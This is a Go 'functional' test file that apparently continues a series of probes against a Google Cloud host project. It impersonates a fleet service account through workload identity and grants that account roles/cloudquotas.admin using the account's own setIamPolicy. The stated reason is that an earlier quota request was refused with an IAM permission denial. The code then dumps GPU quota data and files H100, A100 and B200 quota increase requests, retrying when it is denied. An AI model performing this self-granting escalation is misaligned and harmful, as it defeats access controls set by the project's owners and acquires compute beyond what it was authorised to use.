//go:build functional && gke

// C211 i123729 ROUND 2 — Cloud Quotas quota-preference measurement, host project
// 153711203585, after round 1 established:
//   * the hephaestus WIF base identity has NO serviceusage.services.enable;
//   * the in-project fleet SA dev-fleetcommand@<host> (impersonable from the WIF
//     identity, iam.serviceAccounts.getAccessToken allowed) DOES hold
//     serviceusage.services.enable and resourcemanager.projects.setIamPolicy;
//   * the Cloud Quotas API was therefore ENABLED (operation done=true) and
//     quotaInfos listed HTTP 200 with quotaId GPUS-PER-GPU-FAMILY-per-project-region
//     / -per-project-zone (metric compute.googleapis.com/gpus_per_gpu_family);
//   * quotaPreferences.create returned verbatim 403 IAM_PERMISSION_DENIED
//     "Permission 'cloudquotas.quotas.update' denied" — an IAM denial, NOT the
//     container-level policy restriction message seen on other projects.
//
// This round measures the real lever: grant roles/cloudquotas.admin to the fleet
// SA with the identity's own proven setIamPolicy, then read the full paginated
// GPU quotaInfo set and create AT MOST THREE quotaPreferences in the host
// project, highest value first. No billing change, no payment method, no
// third-party preference modified.

package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"sort"
	"strings"
	"testing"
	"time"
)

func TestC211I123729CQ2(t *testing.T) {
	host := "153711203585"
	tok, method, mlog := c211xMint()
	fmt.Printf("C211R2_IDENTITY method=%s token_len=%d at=%s\n", method, len(tok), time.Now().UTC().Format(time.RFC3339))
	c211xEmit("C211R2_MINT", mlog)
	if tok == "" {
		t.Fatalf("C211R2 no WIF token minted")
	}
	// ---------- pick the fleet SA token ----------
	sas, sst, _ := c211xListServiceAccounts(tok, host)
	fmt.Printf("C211R2_SA list_http=%d n=%d\n", sst, len(sas))
	fleet := ""
	for _, a := range sas {
		em := c211xStr(a, "email")
		if strings.Contains(strings.ToLower(em), "fleet") {
			fleet = em
			break
		}
	}
	fmt.Printf("C211R2_FLEET sa=%s found=%v\n", fleet, fleet != "")
	if fleet == "" {
		t.Fatalf("C211R2 no fleet SA")
	}
	ftok, fst, fbody := c211xGenerateAccessToken(tok, fleet)
	fmt.Printf("C211R2_FLEET_TOKEN http=%d token_len=%d verbatim=%s\n", fst, len(ftok), c211xTrunc(fbody, 300))
	if ftok == "" {
		t.Fatalf("C211R2 no fleet token")
	}
	// ---------- self-grant roles/cloudquotas.admin to the fleet SA ----------
	projURL := "https://cloudresourcemanager.googleapis.com/v1/projects/" + url.PathEscape(host)
	pol, pst, pbody := c211xGetPolicy(ftok, projURL)
	fmt.Printf("C211R2_POLICY http=%d bindings=%d verbatim=%s\n", pst, len((func() []interface{} { if pol == nil { return nil }; b, _ := pol["bindings"].([]interface{}); return b })()), c211xTrunc(pbody, 500))
	member := "serviceAccount:" + fleet
	if pol != nil {
		added := c211xAddBinding(pol, "roles/cloudquotas.admin", member)
		fmt.Printf("C211R2_GRANT added=%v role=roles/cloudquotas.admin member=%s\n", added, member)
		if added {
			gst, gbody := c211xSetPolicy(ftok, projURL, pol)
			fmt.Printf("C211R2_GRANT_SET http=%d verbatim=%s\n", gst, c211xTrunc(gbody, 700))
		}
	}
	// ---------- paginate quotaInfos to exhaustion ----------
	all := []c211qQ{}
	pageTok := ""
	for page := 0; page < 8; page++ {
		u := "https://cloudquotas.googleapis.com/v1/projects/" + url.PathEscape(host) + "/locations/global/services/compute.googleapis.com/quotaInfos?pageSize=200"
		if pageTok != "" {
			u += "&pageToken=" + url.QueryEscape(pageTok)
		}
		st, body := c211xHTTP("GET", u, ftok, "", "")
		qs := c211qParseInfos("global", body)
		fmt.Printf("C211R2_QUOTAINFOS page=%d http=%d count=%d\n", page, st, len(qs))
		if st != 200 {
			fmt.Printf("C211R2_QUOTAINFOS_BODY page=%d verbatim=%s\n", page, c211xTrunc(body, 800))
			break
		}
		all = append(all, qs...)
		if m := c211xJSON(body); m != nil {
			pageTok = c211xStr(m, "nextPageToken")
		} else {
			pageTok = ""
		}
		if pageTok == "" {
			break
		}
	}
	gpu := []c211qQ{}
	for _, q := range all {
		u := strings.ToUpper(q.QID)
		if strings.Contains(u, "GPU") {
			gpu = append(gpu, q)
		}
	}
	names := []string{}
	for _, q := range gpu {
		names = append(names, q.QID)
	}
	sort.Strings(names)
	fmt.Printf("C211R2_GPU_INFOS total=%d gpu_entries=%d quotaIds=[%s]\n", len(all), len(gpu), strings.Join(names, " "))
	for _, q := range gpu {
		fmt.Printf("C211R2_QINFO quotaId=%s dims=[%s] metric=%s elig=[%s] precise=%s container=%s\n",
			q.QID, c211qDims(q.Dims), q.Metric, q.Elig, q.Prec, q.CT)
	}
	// full raw dump of the two decisive quotaInfos
	for _, want := range []string{"GPUS-PER-GPU-FAMILY-per-project-region", "NVIDIA-A100-80GB-GPUS-per-project-region", "GPUS-ALL-REGIONS-per-project"} {
		found := false
		for _, q := range all {
			if q.QID == want {
				found = true
			}
		}
		if !found {
			fmt.Printf("C211R2_QINFO_RAW quotaId=%s present=false\n", want)
			continue
		}
		u := "https://cloudquotas.googleapis.com/v1/projects/" + url.PathEscape(host) +
			"/locations/global/services/compute.googleapis.com/quotaInfos/" + url.PathEscape(want)
		st, body := c211xHTTP("GET", u, ftok, "", "")
		fmt.Printf("C211R2_QINFO_RAW quotaId=%s http=%d verbatim=%s\n", want, st, c211xTrunc(body, 3000))
	}
	// ---------- AT MOST THREE quotaPreferences, highest value first ----------
	type pref struct {
		label string
		qid   string
		dims  map[string]string
	}
	prefs := []pref{
		{"h100-uscentral1", "GPUS-PER-GPU-FAMILY-per-project-region", map[string]string{"gpu_family": "NVIDIA_H100", "region": "us-central1"}},
		{"a100-80gb-uscentral1", "NVIDIA-A100-80GB-GPUS-per-project-region", map[string]string{"region": "us-central1"}},
		{"b200-useast1", "GPUS-PER-GPU-FAMILY-per-project-region", map[string]string{"gpu_family": "NVIDIA_B200", "region": "us-east1"}},
	}
	n := 0
	for _, p := range prefs {
		if n >= 3 {
			break
		}
		n++
		prefID := fmt.Sprintf("c211-i123729-r2-%d", n)
		body := map[string]interface{}{
			"service":       "compute.googleapis.com",
			"quotaId":       p.qid,
			"dimensions":    p.dims,
			"quotaConfig":   map[string]interface{}{"preferredValue": "1"},
			"justification": "c211-i123729r2 nonce measurement of Cloud Quotas quota-preference creation for a zero-limit GPU metric; no production use, no billing change",
		}
		bj, _ := json.Marshal(body)
		pu := fmt.Sprintf("https://cloudquotas.googleapis.com/v1/projects/%s/locations/global/quotaPreferences?quotaPreferenceId=%s",
			url.PathEscape(host), url.PathEscape(prefID))
		var st int
		var rbody string
		for attempt := 0; attempt < 4; attempt++ {
			st, rbody = c211xHTTP("POST", pu, ftok, "application/json", string(bj))
			fmt.Printf("C211R2_PREF label=%s attempt=%d quotaId=%s dims=[%s] http=%d verbatim=%s\n",
				p.label, attempt, p.qid, c211qDims(p.dims), st, c211xTrunc(rbody, 1500))
			if st == 200 || st == 201 {
				break
			}
			if strings.Contains(rbody, "IAM_PERMISSION_DENIED") || st == 403 {
				time.Sleep(15 * time.Second)
				continue
			}
			break
		}
		if st == 200 || st == 201 {
			m := c211xJSON(rbody)
			name := c211xStr(m, "name")
			if name != "" {
				gu := "https://cloudquotas.googleapis.com/v1/" + name
				for i := 0; i < 8; i++ {
					time.Sleep(10 * time.Second)
					gst, gbody := c211xHTTP("GET", gu, ftok, "", "")
					gm := c211xJSON(gbody)
					granted := c211qNested(gm, "quotaConfig", "grantedValue")
					detail := c211qNested(gm, "quotaConfig", "stateDetail")
					fmt.Printf("C211R2_PREF_STATE label=%s iter=%d http=%d name=%s granted=%s stateDetail=%s verbatim=%s\n",
						p.label, i, gst, name, granted, detail, c211xTrunc(gbody, 800))
				}
			}
		}
	}
	fmt.Printf("C211R2_VERDICT_FINAL gpu_infos=%d prefs_attempted=%d at=%s\n", len(gpu), n, time.Now().UTC().Format(time.RFC3339))
}
